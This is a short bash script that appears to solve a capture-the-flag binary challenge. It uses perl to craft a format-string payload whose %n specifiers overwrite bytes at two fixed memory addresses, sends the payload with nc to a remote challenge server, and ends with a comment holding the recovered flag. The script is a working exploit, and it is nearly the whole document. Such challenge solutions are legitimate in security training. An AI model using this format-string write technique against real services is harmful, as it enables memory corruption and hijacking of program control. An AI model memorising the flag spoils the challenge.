#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1

(
perl -e 'print("%182p%9\$n  %16217p%10\$n ", "\x38\x40\x40\x00\x00\x00\x00\x00", "\x39\x40\x40\x00\x00\x00\x00\x00", "\n")'
sleep 1
) | timeout 1 nc 140.113.207.240 8835

echo

# FLAG{TH1S 1S G0T!}
